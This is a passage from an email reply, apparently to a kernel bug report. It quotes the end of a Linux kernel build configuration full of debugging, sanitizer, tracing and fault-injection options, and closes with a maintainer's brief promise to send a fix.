> CONFIG_LIBFDT=3Dy
> CONFIG_OID_REGISTRY=3Dy
> CONFIG_HAVE_GENERIC_VDSO=3Dy
> CONFIG_GENERIC_GETTIMEOFDAY=3Dy
> CONFIG_GENERIC_VDSO_OVERFLOW_PROTECT=3Dy
> CONFIG_VDSO_GETRANDOM=3Dy
> CONFIG_FONT_SUPPORT=3Dy
> # CONFIG_FONTS is not set
> CONFIG_FONT_8x8=3Dy
> CONFIG_FONT_8x16=3Dy
> CONFIG_SG_POOL=3Dy
> CONFIG_ARCH_HAS_PMEM_API=3Dy
> CONFIG_MEMREGION=3Dy
> CONFIG_ARCH_HAS_CPU_CACHE_INVALIDATE_MEMREGION=3Dy
> CONFIG_ARCH_HAS_UACCESS_FLUSHCACHE=3Dy
> CONFIG_ARCH_HAS_COPY_MC=3Dy
> CONFIG_ARCH_STACKWALK=3Dy
> CONFIG_STACKDEPOT=3Dy
> CONFIG_STACKDEPOT_ALWAYS_INIT=3Dy
> CONFIG_STACKDEPOT_MAX_FRAMES=3D64
> CONFIG_REF_TRACKER=3Dy
> CONFIG_SBITMAP=3Dy
> # CONFIG_LWQ_TEST is not set
> # end of Library routines
>=20
> CONFIG_FIRMWARE_TABLE=3Dy
> CONFIG_UNION_FIND=3Dy
>=20
> #
> # Kernel hacking
> #
>=20
> #
> # printk and dmesg options
> #
> CONFIG_PRINTK_TIME=3Dy
> CONFIG_PRINTK_CALLER=3Dy
> # CONFIG_STACKTRACE_BUILD_ID is not set
> CONFIG_CONSOLE_LOGLEVEL_DEFAULT=3D7
> CONFIG_CONSOLE_LOGLEVEL_QUIET=3D4
> CONFIG_MESSAGE_LOGLEVEL_DEFAULT=3D4
> # CONFIG_BOOT_PRINTK_DELAY is not set
> CONFIG_DYNAMIC_DEBUG=3Dy
> CONFIG_DYNAMIC_DEBUG_CORE=3Dy
> CONFIG_SYMBOLIC_ERRNAME=3Dy
> CONFIG_DEBUG_BUGVERBOSE=3Dy
> # CONFIG_DEBUG_BUGVERBOSE_DETAILED is not set
> # end of printk and dmesg options
>=20
> CONFIG_DEBUG_KERNEL=3Dy
> CONFIG_DEBUG_MISC=3Dy
>=20
> #
> # Compile-time checks and compiler options
> #
> CONFIG_DEBUG_INFO=3Dy
> CONFIG_AS_HAS_NON_CONST_ULEB128=3Dy
> # CONFIG_DEBUG_INFO_NONE is not set
> # CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT is not set
> CONFIG_DEBUG_INFO_DWARF4=3Dy
> # CONFIG_DEBUG_INFO_DWARF5 is not set
> # CONFIG_DEBUG_INFO_REDUCED is not set
> CONFIG_DEBUG_INFO_COMPRESSED_NONE=3Dy
> # CONFIG_DEBUG_INFO_COMPRESSED_ZLIB is not set
> # CONFIG_DEBUG_INFO_SPLIT is not set
> CONFIG_DEBUG_INFO_BTF=3Dy
> CONFIG_PAHOLE_HAS_LANG_EXCLUDE=3Dy
> CONFIG_DEBUG_INFO_BTF_MODULES=3Dy
> CONFIG_MODULE_ALLOW_BTF_MISMATCH=3Dy
> # CONFIG_GDB_SCRIPTS is not set
> CONFIG_FRAME_WARN=3D2048
> # CONFIG_STRIP_ASM_SYMS is not set
> # CONFIG_READABLE_ASM is not set
> # CONFIG_HEADERS_INSTALL is not set
> # CONFIG_DEBUG_SECTION_MISMATCH is not set
> CONFIG_SECTION_MISMATCH_WARN_ONLY=3Dy
> # CONFIG_DEBUG_FORCE_FUNCTION_ALIGN_64B is not set
> CONFIG_OBJTOOL=3Dy
> # CONFIG_OBJTOOL_WERROR is not set
> CONFIG_NOINSTR_VALIDATION=3Dy
> # CONFIG_VMLINUX_MAP is not set
> # CONFIG_DEBUG_FORCE_WEAK_PER_CPU is not set
> # end of Compile-time checks and compiler options
>=20
> #
> # Generic Kernel Debugging Instruments
> #
> # CONFIG_MAGIC_SYSRQ is not set
> CONFIG_DEBUG_FS=3Dy
> CONFIG_DEBUG_FS_ALLOW_ALL=3Dy
> # CONFIG_DEBUG_FS_ALLOW_NONE is not set
> CONFIG_HAVE_ARCH_KGDB=3Dy
> # CONFIG_KGDB is not set
> CONFIG_ARCH_HAS_UBSAN=3Dy
> CONFIG_UBSAN=3Dy
> # CONFIG_UBSAN_TRAP is not set
> CONFIG_CC_HAS_UBSAN_BOUNDS_STRICT=3Dy
> CONFIG_UBSAN_BOUNDS=3Dy
> CONFIG_UBSAN_BOUNDS_STRICT=3Dy
> CONFIG_UBSAN_SHIFT=3Dy
> # CONFIG_UBSAN_DIV_ZERO is not set
> # CONFIG_UBSAN_BOOL is not set
> # CONFIG_UBSAN_ENUM is not set
> # CONFIG_UBSAN_ALIGNMENT is not set
> # CONFIG_TEST_UBSAN is not set
> CONFIG_HAVE_ARCH_KCSAN=3Dy
> CONFIG_HAVE_KCSAN_COMPILER=3Dy
> # end of Generic Kernel Debugging Instruments
>=20
> #
> # Networking Debugging
> #
> CONFIG_NET_DEV_REFCNT_TRACKER=3Dy
> CONFIG_NET_NS_REFCNT_TRACKER=3Dy
> CONFIG_DEBUG_NET=3Dy
> # CONFIG_DEBUG_NET_SMALL_RTNL is not set
> # end of Networking Debugging
>=20
> #
> # Memory Debugging
> #
> CONFIG_PAGE_EXTENSION=3Dy
> # CONFIG_DEBUG_PAGEALLOC is not set
> CONFIG_SLUB_DEBUG=3Dy
> # CONFIG_SLUB_DEBUG_ON is not set
> CONFIG_SLUB_RCU_DEBUG=3Dy
> CONFIG_PAGE_OWNER=3Dy
> CONFIG_PAGE_TABLE_CHECK=3Dy
> CONFIG_PAGE_TABLE_CHECK_ENFORCED=3Dy
> CONFIG_PAGE_POISONING=3Dy
> # CONFIG_DEBUG_PAGE_REF is not set
> # CONFIG_DEBUG_RODATA_TEST is not set
> CONFIG_ARCH_HAS_DEBUG_WX=3Dy
> CONFIG_DEBUG_WX=3Dy
> CONFIG_ARCH_HAS_PTDUMP=3Dy
> CONFIG_PTDUMP=3Dy
> CONFIG_PTDUMP_DEBUGFS=3Dy
> CONFIG_HAVE_DEBUG_KMEMLEAK=3Dy
> # CONFIG_DEBUG_KMEMLEAK is not set
> # CONFIG_PER_VMA_LOCK_STATS is not set
> CONFIG_DEBUG_OBJECTS=3Dy
> # CONFIG_DEBUG_OBJECTS_SELFTEST is not set
> CONFIG_DEBUG_OBJECTS_FREE=3Dy
> CONFIG_DEBUG_OBJECTS_TIMERS=3Dy
> CONFIG_DEBUG_OBJECTS_WORK=3Dy
> CONFIG_DEBUG_OBJECTS_RCU_HEAD=3Dy
> CONFIG_DEBUG_OBJECTS_PERCPU_COUNTER=3Dy
> CONFIG_DEBUG_OBJECTS_ENABLE_DEFAULT=3D1
> # CONFIG_SHRINKER_DEBUG is not set
> CONFIG_DEBUG_STACK_USAGE=3Dy
> CONFIG_SCHED_STACK_END_CHECK=3Dy
> CONFIG_ARCH_HAS_DEBUG_VM_PGTABLE=3Dy
> CONFIG_DEBUG_VFS=3Dy
> CONFIG_DEBUG_VM_IRQSOFF=3Dy
> CONFIG_DEBUG_VM=3Dy
> CONFIG_DEBUG_VM_MAPLE_TREE=3Dy
> CONFIG_DEBUG_VM_RB=3Dy
> CONFIG_DEBUG_VM_PGFLAGS=3Dy
> CONFIG_DEBUG_VM_PGTABLE=3Dy
> CONFIG_ARCH_HAS_DEBUG_VIRTUAL=3Dy
> CONFIG_DEBUG_VIRTUAL=3Dy
> CONFIG_DEBUG_MEMORY_INIT=3Dy
> CONFIG_DEBUG_PER_CPU_MAPS=3Dy
> CONFIG_DEBUG_KMAP_LOCAL=3Dy
> CONFIG_ARCH_SUPPORTS_KMAP_LOCAL_FORCE_MAP=3Dy
> CONFIG_DEBUG_KMAP_LOCAL_FORCE_MAP=3Dy
> # CONFIG_MEM_ALLOC_PROFILING is not set
> CONFIG_HAVE_ARCH_KASAN=3Dy
> CONFIG_HAVE_ARCH_KASAN_VMALLOC=3Dy
> CONFIG_CC_HAS_KASAN_GENERIC=3Dy
> CONFIG_CC_HAS_WORKING_NOSANITIZE_ADDRESS=3Dy
> CONFIG_KASAN=3Dy
> CONFIG_KASAN_GENERIC=3Dy
> # CONFIG_KASAN_OUTLINE is not set
> CONFIG_KASAN_INLINE=3Dy
> CONFIG_KASAN_STACK=3Dy
> CONFIG_KASAN_VMALLOC=3Dy
> # CONFIG_KASAN_EXTRA_INFO is not set
> CONFIG_HAVE_ARCH_KFENCE=3Dy
> CONFIG_KFENCE=3Dy
> CONFIG_KFENCE_SAMPLE_INTERVAL=3D100
> CONFIG_KFENCE_NUM_OBJECTS=3D255
> # CONFIG_KFENCE_DEFERRABLE is not set
> CONFIG_KFENCE_STATIC_KEYS=3Dy
> CONFIG_KFENCE_STRESS_TEST_FAULTS=3D0
> CONFIG_HAVE_ARCH_KMSAN=3Dy
> # end of Memory Debugging
>=20
> # CONFIG_DEBUG_SHIRQ is not set
>=20
> #
> # Debug Oops, Lockups and Hangs
> #
> CONFIG_PANIC_ON_OOPS=3Dy
> CONFIG_PANIC_TIMEOUT=3D86400
> CONFIG_LOCKUP_DETECTOR=3Dy
> CONFIG_SOFTLOCKUP_DETECTOR=3Dy
> # CONFIG_SOFTLOCKUP_DETECTOR_INTR_STORM is not set
> CONFIG_BOOTPARAM_SOFTLOCKUP_PANIC=3D0
> CONFIG_HAVE_HARDLOCKUP_DETECTOR_BUDDY=3Dy
> CONFIG_HARDLOCKUP_DETECTOR=3Dy
> # CONFIG_HARDLOCKUP_DETECTOR_PREFER_BUDDY is not set
> CONFIG_HARDLOCKUP_DETECTOR_PERF=3Dy
> # CONFIG_HARDLOCKUP_DETECTOR_BUDDY is not set
> # CONFIG_HARDLOCKUP_DETECTOR_ARCH is not set
> CONFIG_HARDLOCKUP_DETECTOR_COUNTS_HRTIMER=3Dy
> CONFIG_HARDLOCKUP_CHECK_TIMESTAMP=3Dy
> CONFIG_BOOTPARAM_HARDLOCKUP_PANIC=3Dy
> CONFIG_DETECT_HUNG_TASK=3Dy
> CONFIG_DEFAULT_HUNG_TASK_TIMEOUT=3D140
> CONFIG_BOOTPARAM_HUNG_TASK_PANIC=3D0
> # CONFIG_DETECT_HUNG_TASK_BLOCKER is not set
> CONFIG_WQ_WATCHDOG=3Dy
> CONFIG_BOOTPARAM_WQ_STALL_PANIC=3D0
> # CONFIG_WQ_CPU_INTENSIVE_REPORT is not set
> # CONFIG_TEST_LOCKUP is not set
> # end of Debug Oops, Lockups and Hangs
>=20
> #
> # Scheduler Debugging
> #
> CONFIG_SCHED_INFO=3Dy
> CONFIG_SCHEDSTATS=3Dy
> # end of Scheduler Debugging
>=20
> CONFIG_DEBUG_PREEMPT=3Dy
> # CONFIG_DEBUG_ATOMIC is not set
>=20
> #
> # Lock Debugging (spinlocks, mutexes, etc...)
> #
> CONFIG_LOCK_DEBUGGING_SUPPORT=3Dy
> CONFIG_PROVE_LOCKING=3Dy
> CONFIG_PROVE_RAW_LOCK_NESTING=3Dy
> # CONFIG_LOCK_STAT is not set
> CONFIG_DEBUG_RT_MUTEXES=3Dy
> CONFIG_DEBUG_SPINLOCK=3Dy
> CONFIG_DEBUG_MUTEXES=3Dy
> CONFIG_DEBUG_WW_MUTEX_SLOWPATH=3Dy
> CONFIG_DEBUG_RWSEMS=3Dy
> CONFIG_DEBUG_LOCK_ALLOC=3Dy
> CONFIG_LOCKDEP=3Dy
> CONFIG_LOCKDEP_BITS=3D20
> CONFIG_LOCKDEP_CHAINS_BITS=3D20
> CONFIG_LOCKDEP_STACK_TRACE_BITS=3D20
> CONFIG_LOCKDEP_STACK_TRACE_HASH_BITS=3D14
> CONFIG_LOCKDEP_CIRCULAR_QUEUE_BITS=3D12
> # CONFIG_DEBUG_LOCKDEP is not set
> CONFIG_DEBUG_ATOMIC_SLEEP=3Dy
> # CONFIG_DEBUG_LOCKING_API_SELFTESTS is not set
> # CONFIG_LOCK_TORTURE_TEST is not set
> # CONFIG_WW_MUTEX_SELFTEST is not set
> # CONFIG_SCF_TORTURE_TEST is not set
> CONFIG_CSD_LOCK_WAIT_DEBUG=3Dy
> # CONFIG_CSD_LOCK_WAIT_DEBUG_DEFAULT is not set
> # end of Lock Debugging (spinlocks, mutexes, etc...)
>=20
> CONFIG_TRACE_IRQFLAGS=3Dy
> CONFIG_TRACE_IRQFLAGS_NMI=3Dy
> CONFIG_NMI_CHECK_CPU=3Dy
> CONFIG_DEBUG_IRQFLAGS=3Dy
> CONFIG_STACKTRACE=3Dy
> # CONFIG_DEBUG_KOBJECT is not set
> # CONFIG_DEBUG_KOBJECT_RELEASE is not set
>=20
> #
> # Debug kernel data structures
> #
> CONFIG_DEBUG_LIST=3Dy
> CONFIG_DEBUG_PLIST=3Dy
> CONFIG_DEBUG_SG=3Dy
> CONFIG_DEBUG_NOTIFIERS=3Dy
> # CONFIG_DEBUG_CLOSURES is not set
> CONFIG_DEBUG_MAPLE_TREE=3Dy
> # end of Debug kernel data structures
>=20
> #
> # RCU Debugging
> #
> CONFIG_PROVE_RCU=3Dy
> # CONFIG_RCU_SCALE_TEST is not set
> # CONFIG_RCU_TORTURE_TEST is not set
> # CONFIG_RCU_REF_SCALE_TEST is not set
> CONFIG_RCU_CPU_STALL_TIMEOUT=3D100
> CONFIG_RCU_EXP_CPU_STALL_TIMEOUT=3D0
> # CONFIG_RCU_CPU_STALL_CPUTIME is not set
> # CONFIG_RCU_TRACE is not set
> CONFIG_RCU_EQS_DEBUG=3Dy
> # end of RCU Debugging
>=20
> # CONFIG_DEBUG_WQ_FORCE_RR_CPU is not set
> # CONFIG_CPU_HOTPLUG_STATE_CONTROL is not set
> # CONFIG_LATENCYTOP is not set
> CONFIG_USER_STACKTRACE_SUPPORT=3Dy
> CONFIG_NOP_TRACER=3Dy
> CONFIG_HAVE_RETHOOK=3Dy
> CONFIG_HAVE_FUNCTION_TRACER=3Dy
> CONFIG_HAVE_FUNCTION_GRAPH_TRACER=3Dy
> CONFIG_HAVE_FUNCTION_GRAPH_FREGS=3Dy
> CONFIG_HAVE_FTRACE_GRAPH_FUNC=3Dy
> CONFIG_HAVE_DYNAMIC_FTRACE=3Dy
> CONFIG_HAVE_DYNAMIC_FTRACE_WITH_REGS=3Dy
> CONFIG_HAVE_DYNAMIC_FTRACE_WITH_DIRECT_CALLS=3Dy
> CONFIG_HAVE_SINGLE_FTRACE_DIRECT_OPS=3Dy
> CONFIG_HAVE_DYNAMIC_FTRACE_WITH_ARGS=3Dy
> CONFIG_HAVE_FTRACE_REGS_HAVING_PT_REGS=3Dy
> CONFIG_HAVE_DYNAMIC_FTRACE_NO_PATCHABLE=3Dy
> CONFIG_HAVE_DYNAMIC_FTRACE_WITH_JMP=3Dy
> CONFIG_HAVE_SYSCALL_TRACEPOINTS=3Dy
> CONFIG_HAVE_FENTRY=3Dy
> CONFIG_HAVE_OBJTOOL_MCOUNT=3Dy
> CONFIG_HAVE_OBJTOOL_NOP_MCOUNT=3Dy
> CONFIG_HAVE_C_RECORDMCOUNT=3Dy
> CONFIG_HAVE_BUILDTIME_MCOUNT_SORT=3Dy
> CONFIG_BUILDTIME_MCOUNT_SORT=3Dy
> CONFIG_TRACE_CLOCK=3Dy
> CONFIG_RING_BUFFER=3Dy
> CONFIG_EVENT_TRACING=3Dy
> CONFIG_CONTEXT_SWITCH_TRACER=3Dy
> CONFIG_PREEMPTIRQ_TRACEPOINTS=3Dy
> CONFIG_TRACING=3Dy
> CONFIG_GENERIC_TRACER=3Dy
> CONFIG_TRACING_SUPPORT=3Dy
> CONFIG_FTRACE=3Dy
> CONFIG_TRACEFS_AUTOMOUNT_DEPRECATED=3Dy
> # CONFIG_BOOTTIME_TRACING is not set
> CONFIG_FUNCTION_TRACER=3Dy
> CONFIG_FUNCTION_GRAPH_TRACER=3Dy
> # CONFIG_FUNCTION_GRAPH_RETVAL is not set
> # CONFIG_FUNCTION_GRAPH_RETADDR is not set
> CONFIG_DYNAMIC_FTRACE=3Dy
> CONFIG_DYNAMIC_FTRACE_WITH_REGS=3Dy
> CONFIG_DYNAMIC_FTRACE_WITH_DIRECT_CALLS=3Dy
> CONFIG_DYNAMIC_FTRACE_WITH_ARGS=3Dy
> CONFIG_DYNAMIC_FTRACE_WITH_JMP=3Dy
> # CONFIG_FUNCTION_SELF_TRACING is not set
> # CONFIG_FPROBE is not set
> # CONFIG_FUNCTION_PROFILER is not set
> # CONFIG_STACK_TRACER is not set
> # CONFIG_IRQSOFF_TRACER is not set
> # CONFIG_PREEMPT_TRACER is not set
> # CONFIG_SCHED_TRACER is not set
> # CONFIG_HWLAT_TRACER is not set
> # CONFIG_OSNOISE_TRACER is not set
> # CONFIG_TIMERLAT_TRACER is not set
> # CONFIG_MMIOTRACE is not set
> # CONFIG_FTRACE_SYSCALLS is not set
> # CONFIG_TRACER_SNAPSHOT is not set
> CONFIG_BRANCH_PROFILE_NONE=3Dy
> # CONFIG_PROFILE_ANNOTATED_BRANCHES is not set
> CONFIG_BLK_DEV_IO_TRACE=3Dy
> CONFIG_UPROBE_EVENTS=3Dy
> CONFIG_EPROBE_EVENTS=3Dy
> CONFIG_BPF_EVENTS=3Dy
> CONFIG_DYNAMIC_EVENTS=3Dy
> CONFIG_PROBE_EVENTS=3Dy
> CONFIG_FTRACE_MCOUNT_USE_CC=3Dy
> # CONFIG_SYNTH_EVENTS is not set
> # CONFIG_USER_EVENTS is not set
> # CONFIG_HIST_TRIGGERS is not set
> CONFIG_TRACE_EVENT_INJECT=3Dy
> # CONFIG_TRACEPOINT_BENCHMARK is not set
> # CONFIG_RING_BUFFER_BENCHMARK is not set
> # CONFIG_TRACE_EVAL_MAP_FILE is not set
> # CONFIG_FTRACE_RECORD_RECURSION is not set
> # CONFIG_FTRACE_VALIDATE_RCU_IS_WATCHING is not set
> # CONFIG_FTRACE_STARTUP_TEST is not set
> # CONFIG_FTRACE_SORT_STARTUP_TEST is not set
> # CONFIG_RING_BUFFER_STARTUP_TEST is not set
> CONFIG_RING_BUFFER_VALIDATE_TIME_DELTAS=3Dy
> # CONFIG_PREEMPTIRQ_DELAY_TEST is not set
> # CONFIG_RV is not set
> CONFIG_PROVIDE_OHCI1394_DMA_INIT=3Dy
> # CONFIG_SAMPLES is not set
> CONFIG_HAVE_SAMPLE_FTRACE_DIRECT=3Dy
> CONFIG_HAVE_SAMPLE_FTRACE_DIRECT_MULTI=3Dy
> CONFIG_ARCH_HAS_DEVMEM_IS_ALLOWED=3Dy
> # CONFIG_STRICT_DEVMEM is not set
>=20
> #
> # x86 Debugging
> #
> CONFIG_EARLY_PRINTK_USB=3Dy
> CONFIG_X86_VERBOSE_BOOTUP=3Dy
> CONFIG_EARLY_PRINTK=3Dy
> CONFIG_EARLY_PRINTK_DBGP=3Dy
> # CONFIG_EARLY_PRINTK_USB_XDBC is not set
> # CONFIG_DEBUG_TLBFLUSH is not set
> CONFIG_HAVE_MMIOTRACE_SUPPORT=3Dy
> # CONFIG_X86_DECODER_SELFTEST is not set
> CONFIG_IO_DELAY_0X80=3Dy
> # CONFIG_IO_DELAY_0XED is not set
> # CONFIG_IO_DELAY_UDELAY is not set
> # CONFIG_IO_DELAY_NONE is not set
> CONFIG_DEBUG_BOOT_PARAMS=3Dy
> # CONFIG_CPA_DEBUG is not set
> CONFIG_DEBUG_ENTRY=3Dy
> # CONFIG_DEBUG_NMI_SELFTEST is not set
> CONFIG_X86_DEBUG_FPU=3Dy
> # CONFIG_PUNIT_ATOM_DEBUG is not set
> CONFIG_UNWINDER_ORC=3Dy
> # CONFIG_UNWINDER_FRAME_POINTER is not set
> # end of x86 Debugging
>=20
> #
> # Kernel Testing and Coverage
> #
> # CONFIG_KUNIT is not set
> # CONFIG_NOTIFIER_ERROR_INJECTION is not set
> CONFIG_FAULT_INJECTION=3Dy
> CONFIG_FAILSLAB=3Dy
> CONFIG_FAIL_PAGE_ALLOC=3Dy
> CONFIG_FAULT_INJECTION_USERCOPY=3Dy
> CONFIG_FAIL_MAKE_REQUEST=3Dy
> CONFIG_FAIL_IO_TIMEOUT=3Dy
> CONFIG_FAIL_FUTEX=3Dy
> CONFIG_FAULT_INJECTION_DEBUG_FS=3Dy
> # CONFIG_FAIL_MMC_REQUEST is not set
> # CONFIG_FAIL_SKB_REALLOC is not set
> CONFIG_FAULT_INJECTION_CONFIGFS=3Dy
> # CONFIG_FAULT_INJECTION_STACKTRACE_FILTER is not set
> CONFIG_ARCH_HAS_KCOV=3Dy
> CONFIG_KCOV=3Dy
> CONFIG_KCOV_ENABLE_COMPARISONS=3Dy
> CONFIG_KCOV_INSTRUMENT_ALL=3Dy
> CONFIG_KCOV_IRQ_AREA_SIZE=3D0x40000
> # CONFIG_KCOV_SELFTEST is not set
> CONFIG_RUNTIME_TESTING_MENU=3Dy
> # CONFIG_TEST_DHRY is not set
> # CONFIG_LKDTM is not set
> # CONFIG_TEST_DIV64 is not set
> # CONFIG_TEST_MULDIV64 is not set
> # CONFIG_BACKTRACE_SELF_TEST is not set
> # CONFIG_TEST_REF_TRACKER is not set
> # CONFIG_RBTREE_TEST is not set
> # CONFIG_REED_SOLOMON_TEST is not set
> # CONFIG_INTERVAL_TREE_TEST is not set
> # CONFIG_PERCPU_TEST is not set
> # CONFIG_ATOMIC64_SELFTEST is not set
> # CONFIG_ASYNC_RAID6_TEST is not set
> # CONFIG_TEST_HEXDUMP is not set
> # CONFIG_TEST_KSTRTOX is not set
> # CONFIG_TEST_BITMAP is not set
> # CONFIG_TEST_XARRAY is not set
> # CONFIG_TEST_MAPLE_TREE is not set
> # CONFIG_TEST_RHASHTABLE is not set
> # CONFIG_TEST_IDA is not set
> # CONFIG_TEST_LKM is not set
> # CONFIG_TEST_BITOPS is not set
> # CONFIG_TEST_VMALLOC is not set
> CONFIG_TEST_BPF=3Dm
> # CONFIG_FIND_BIT_BENCHMARK is not set
> # CONFIG_TEST_FIRMWARE is not set
> # CONFIG_TEST_SYSCTL is not set
> # CONFIG_CONTEXT_ANALYSIS_TEST is not set
> # CONFIG_TEST_UDELAY is not set
> # CONFIG_TEST_STATIC_KEYS is not set
> # CONFIG_TEST_DYNAMIC_DEBUG is not set
> # CONFIG_TEST_KMOD is not set
> # CONFIG_TEST_KALLSYMS is not set
> # CONFIG_TEST_DEBUG_VIRTUAL is not set
> # CONFIG_TEST_MEMCAT_P is not set
> # CONFIG_TEST_MEMINIT is not set
> # CONFIG_TEST_HMM is not set
> # CONFIG_TEST_FREE_PAGES is not set
> # CONFIG_TEST_CLOCKSOURCE_WATCHDOG is not set
> # CONFIG_TEST_OBJPOOL is not set
> CONFIG_ARCH_USE_MEMTEST=3Dy
> # CONFIG_MEMTEST is not set
> # end of Kernel Testing and Coverage
>=20
> #
> # Rust hacking
> #
> # end of Rust hacking
> # end of Kernel hacking
>=20
> CONFIG_IO_URING_ZCRX=3Dy
> CONFIG_IO_URING_BPF=3Dy

Thanks for the report. Will take a look at this and send through the
needed fix.
